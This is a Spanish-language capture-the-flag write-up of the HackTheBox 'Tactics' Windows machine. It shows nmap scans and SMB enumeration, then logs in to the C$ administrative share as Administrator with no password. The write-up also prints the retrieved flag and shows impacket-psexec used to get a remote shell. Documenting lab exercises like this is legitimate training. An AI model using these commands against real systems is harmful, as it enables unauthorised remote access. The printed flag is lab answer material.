---
publish: true
created: 2026-09-11T12:16:55.947Z
modified: 2026-09-11T12:24:56.592Z
---

# Tactics

Plataforma: HackTheBox
OS: Windows
Level: Very Easy
Status: Done
Complete: Yes
Created time: 10 de enero de 2025 20:23
IP: 10.129.232.71

## Recopilación de información

<aside>
💡

</aside>

### **Escaneo de puertos**

Comenzamos con un escaneo para identificar que puertos están abiertos.

---

```bash
❯ sudo nmap -p- --open --min-rate 5000 -sS -n -Pn -vvv 10.129.232.71 -oG allports

PORT    STATE SERVICE      REASON
135/tcp open  msrpc        syn-ack ttl 127
139/tcp open  netbios-ssn  syn-ack ttl 127
445/tcp open  microsoft-ds syn-ack ttl 127

```

### **Enumeración de servicios**

Una vez listado los puertos accesibles, procederemos a realizar la enumeración de servicios para su posterior identificación de vulnerabilidades.

---

```bash
❯ sudo nmap -p135,139,445 -sCV 10.129.232.71 -oN targeted

PORT    STATE SERVICE       VERSION
135/tcp open  msrpc         Microsoft Windows RPC
139/tcp open  netbios-ssn   Microsoft Windows netbios-ssn
445/tcp open  microsoft-ds?
Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
|_clock-skew: -15s
| smb2-time: 
|   date: 2025-01-10T19:30:56
|_  start_date: N/A
| smb2-security-mode: 
|   3:1:1: 
|_    Message signing enabled but not required
```

- **Identificación de vulnerabilidades**
  - 135/tcp open  msrpc         Microsoft Windows RPC
  - 139/tcp open  netbios-ssn   Microsoft Windows netbios-ssn
  - 445/tcp open  microsoft-ds?

- **Enumeracion 445**

  Probamos a listar recursos como administrador

  ```sql
  smbclient -L 10.129.23.24 -U Administrator
   Sharename       Type      Comment
  	---------       ----      -------
  	ADMIN$          Disk      Remote Admin
  	C$              Disk      Default share
  	IPC$            IPC       Remote IPC
  ```

  Nos conectamos al recurso C\$ sin password

  ```sql
  ❯ smbclient //10.129.23.24/C$ -U Administrator
  ```

  Obtenemos la flag:

  ```sql
  smb: \users\administrator\Desktop\> ls
    .                                  DR        0  Thu Apr 22 09:16:03 2021
    ..                                 DR        0  Thu Apr 22 09:16:03 2021
    desktop.ini                       AHS      282  Wed Apr 21 17:23:32 2021
    flag.txt                            A       32  Fri Apr 23 11:39:00 2021

  smb: \users\administrator\Desktop\> get flag.txt
  ```

  ```sql
  cat flag.txt
  ───────┬─────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────
         │ File: flag.txt
  ───────┼─────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────
     1   │ f751c19eda8f61ce81827e6930a1f40c
  ```

  Podriamos haber usado impacket para conseguir una shell:

  ```sql
  ❯ impacket-psexec TACTICS/Administrator@10.129.23.24
  Impacket v0.12.0 - Copyright Fortra, LLC and its affiliated companies 

  Password:
  [*] Requesting shares on 10.129.23.24.....
  [*] Found writable share ADMIN$
  [*] Uploading file KSMlzWRw.exe
  [*] Opening SVCManager on 10.129.23.24.....
  [*] Creating service XfAT on 10.129.23.24.....
  [*] Starting service XfAT.....
  [!] Press help for extra shell commands
  Microsoft Windows [Version 10.0.17763.107]
  (c) 2018 Microsoft Corporation. All rights reserved.

  C:\Windows\system32> ls
  ```

## Conclusión

<aside>
💡 Maquina sin explotación ni escalada de privilegios. Tener presente usar siempre credenciales por defecto.

</aside>
